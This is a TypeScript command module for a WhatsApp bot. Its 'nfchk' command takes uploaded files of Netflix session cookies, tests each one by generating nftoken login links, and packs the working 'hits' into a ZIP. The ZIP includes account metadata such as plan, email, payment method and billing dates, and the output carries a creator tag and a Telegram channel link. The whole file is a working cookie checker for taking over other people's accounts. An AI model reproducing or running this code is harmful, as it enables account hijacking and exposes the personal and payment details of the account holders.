import axios from 'axios'
import { extractCookies, buildCookieString, generateToken, getMetadata } from './a.ts'

function getPlanType(planName: string): string {
  if (!planName) return 'Unknown'
  const p = planName.toLowerCase()
  if (p.includes('premium')) return 'Premium'
  if (p.includes('standard')) return 'Standard'
  if (p.includes('basic')) return 'Basic'
  if (p.includes('essential')) return 'Essential'
  if (p.includes('mobile')) return 'Mobile'
  return planName
}

function getCountryCode(meta: any): string {
  const cs = meta?.country_signup
  if (cs) {
    const str = String(cs).trim().toUpperCase()
    if (str.length <= 3 && /^[A-Z]+$/.test(str)) return str
    const letters = str.replace(/[^A-Z]/g, '')
    if (letters.length >= 2) return letters.slice(0, 2)
  }
  return 'XX'
}

function formatResultFile(cookieStr: string, link: string, meta: any): string {
  let content = `🍪 Netflix Cookie\n`
  content += `-----------------------------------------------------\n`
  content += `${cookieStr}\n`
  content += `-----------------------------------------------------\n`
  content += `🧃 Información de cookie\n\n`
  content += ` 🧨 Pais: ${meta?.country_signup || 'N/A'}\n\n`
  content += `🎋 Plan: ${meta?.plan || 'N/A'}\n`
  content += `🎐 Calidad: ${meta?.video_quality || 'N/A'}\n`
  content += `🎈 Próximo cobro: ${meta?.next_billing || 'N/A'}\n`
  content += `🧧 Miembro desde: ${meta?.member_since || 'N/A'}\n`
  if (meta?.email) content += `📧 Email: ${meta.email}\n`
  if (meta?.payment_method) content += `💳 Método de pago: ${meta.payment_method}\n`
  content += `\n-----------------------------------------------------\n`
  content += `🔥 Creado por HacheJota\n`
  content += `⭐️ Canal de tg: https://t.me/+6QTlv5t308owNjMx\n`
  content += `---------------------------------------------------\n`
  return content
}

function getProgressBar(current: number, total: number, length = 10): string {
  const percent = current / total
  const filled = Math.floor(length * percent)
  const bar = '▓'.repeat(filled) + '░'.repeat(length - filled)
  return `[${bar}] ${Math.floor(percent * 100)}%`
}

export default {
  command: ['nfchk', 'chk'],
  description: 'Sube un archivo .txt de cookies de Netflix y obtén resultados en ZIP',
  category: 'tools',
  run: async (sock: any, m: any, { prefix }: any) => {
    const msg = m.message
    const hasDocument =
      msg?.documentMessage ||
      msg?.documentWithCaptionMessage?.message?.documentMessage

    if (!hasDocument) {
      await sock.sendMessage(m.chat, {
        text: `*Uso:* ${prefix}nfchk\n\nEnvía este comando junto con un archivo *.txt* adjunto con las cookies de Netflix.\n\n*Formatos soportados:* Netscape, JSON, Raw`,
      }, { quoted: m })
      return
    }

    await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } })

    let fileBuffer: Buffer
    try {
      const docMsg = msg?.documentMessage || msg?.documentWithCaptionMessage?.message?.documentMessage
      const stream = await sock.downloadMediaMessage(m)
      const chunks: Buffer[] = []
      for await (const chunk of stream) chunks.push(chunk)
      fileBuffer = Buffer.concat(chunks)
    } catch {
      await sock.sendMessage(m.chat, { text: '❌ No pude descargar el archivo.' }, { quoted: m })
      return
    }

    const content = fileBuffer.toString('utf-8')
    const cookiesList = extractCookies(content)

    if (!cookiesList.length) {
      await sock.sendMessage(m.chat, {
        text: '⚠️ No se encontraron cookies válidas en el archivo.',
      }, { quoted: m })
      return
    }

    const total = cookiesList.length
    const statusMsg = await sock.sendMessage(m.chat, {
      text: `🔍 *Iniciando verificación...*\nTotal: *${total}* cookies encontradas`,
    }, { quoted: m })

    let successCount = 0
    let failedCount = 0
    const validResults: Array<{ cookieStr: string; link: string; meta: any }> = []

    for (let i = 0; i < cookiesList.length; i++) {
      if (i % 3 === 0 || i === total - 1) {
        const bar = getProgressBar(i, total)
        await sock.sendMessage(m.chat, {
          text: `⚡ *Verificando...*\n${bar}\nProcesados: ${i}/${total}\n✅ Hits: ${successCount} | ❌ Fails: ${failedCount}`,
          edit: statusMsg.key,
        })
      }

      const cd = cookiesList[i]
      const tokenResult = await generateToken(cd)

      if (tokenResult.ok && tokenResult.token) {
        successCount++
        const meta = await getMetadata(cd)
        validResults.push({
          cookieStr: buildCookieString(cd),
          link: `https://netflix.com/?nftoken=${tokenResult.token}`,
          meta,
        })
      } else {
        failedCount++
      }

      if (i % 5 === 0) await new Promise(r => setTimeout(r, 300))
    }

    await sock.sendMessage(m.chat, {
      text: `✅ *PROCESO COMPLETADO*\n\n├ 📊 Total: \`${total}\`\n├ ✨ Hits: \`${successCount}\`\n└ 💀 Fails: \`${failedCount}\``,
      edit: statusMsg.key,
    })

    if (!validResults.length) {
      await sock.sendMessage(m.chat, {
        text: '💀 No se encontraron cookies válidas.',
      }, { quoted: m })
      await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      return
    }

    const JSZip = require('jszip')
    const zip = new JSZip()

    validResults.forEach((r, idx) => {
      const plan = getPlanType(r.meta?.plan)
      const country = getCountryCode(r.meta)
      const filename = `[${plan}] [${country}] [${String(idx + 1).padStart(4, '0')}] Netflix.txt`
      zip.file(filename, formatResultFile(r.cookieStr, r.link, r.meta))
    })

    const zipBuffer: Buffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' })
    const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)

    await sock.sendMessage(m.chat, {
      document: zipBuffer,
      fileName: `Netflix_Cookies_${timestamp}.zip`,
      mimetype: 'application/zip',
      caption: `📦 *${successCount} cuentas válidas*\nFormato: \`[Plan] [PAIS] [XXXX] Netflix.txt\``,
    }, { quoted: m })

    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  },
}
